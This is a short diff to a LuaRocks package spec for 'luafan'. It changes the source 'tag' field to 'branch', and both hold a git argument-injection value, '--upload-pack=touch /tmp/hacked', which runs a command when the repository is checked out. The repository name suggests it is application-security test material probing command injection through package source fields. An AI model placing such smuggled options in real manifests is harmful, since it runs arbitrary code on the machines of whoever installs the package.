@@ -2,5 +2,5 @@ package = "luafan"
 version = "0.7-2"
 source = {
    url = "git+https://github.com/y4ppieflu/appsec_tests.git",
-   tag = "--upload-pack=touch /tmp/hacked"
+   branch = "--upload-pack=touch /tmp/hacked"
 }
